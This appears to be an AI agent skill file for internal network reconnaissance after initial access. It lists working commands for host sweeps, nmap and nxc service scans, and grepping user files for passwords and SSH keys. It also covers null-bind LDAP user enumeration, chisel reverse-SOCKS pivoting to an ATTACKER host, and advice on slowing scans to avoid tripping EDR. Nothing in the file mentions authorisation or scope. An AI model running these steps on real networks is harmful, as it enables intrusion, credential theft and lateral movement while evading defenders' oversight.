---
name: internal-recon
description: "Internal network reconnaissance after initial access: host discovery, service mapping, and trust boundary identification from inside. Use this skill once you have a foothold in an internal network."
---

# Internal Recon

## Overview

From inside, the network looks different: no perimeter filtering, but EDR and segmentation. Map hosts, services, and trust.

## Host discovery

```bash
# from a Linux foothold
for i in $(seq 1 254); do (ping -c1 -W1 10.0.0.$i >/dev/null 2>&1 && echo "10.0.0.$i up") & done; wait

nmap -sn 10.0.0.0/24
nxc smb 10.0.0.0/24      # fast, also reveals hostname/domain
```

## Service mapping

```bash
nmap -sV -sC -p- --min-rate 2000 10.0.0.0/24 -oA internal
nmap -p 88,389,636,445,3389,5985 10.0.0.0/24 --open
```

Domain controllers: ports 88, 389, 636, 3268, 53, 464.

## Segment discovery

```bash
ip a; ip route
arp -a
cat /etc/hosts
# Windows
ipconfig /all
route print
net view /domain
```

Multiple subnets in the route table = multiple segments to cross.

## Trust boundaries

| Boundary | Signal |
|---|---|
| Domain join | `systeminfo | findstr /i domain` |
| Forest trust | `nltest /domain_trusts` |
| Admin subnet | hosts running 3389 with no auth |
| Jump host | many RDP sessions |

## Sensitive data on hosts

```bash
# Windows
dir /s /b C:\Users\*\Documents\*.txt 2>nul
findstr /si "password" C:\Users\*.txt C:\Users\*.xml
# Linux
grep -ril "password" /home 2>/dev/null | head
ls -la ~/.ssh
```

## Directory services from inside

```bash
# if the foothold is domain-joined
nltest /dsgetdc:domain.local
nxc ldap DC -u '' -p '' --users    # if null binding allowed
```

## Pivoting setup

```bash
# Linux
./chisel client ATTACKER:8080 R:socks
proxychains4 nmap -sT -Pn 172.16.0.0/24
# Windows
.\chisel.exe client ATTACKER:8080 R:socks
```

## Pitfalls

- Aggressive scanning from an internal host trips EDR — slow down and use authenticated enumeration.
- Port 445 open does not mean SMB is usable — check signing and access.
- The DC list from DNS is the fastest way to find the domain's core.

## Verification

Every host in the map must be confirmed alive and its key ports verified open.
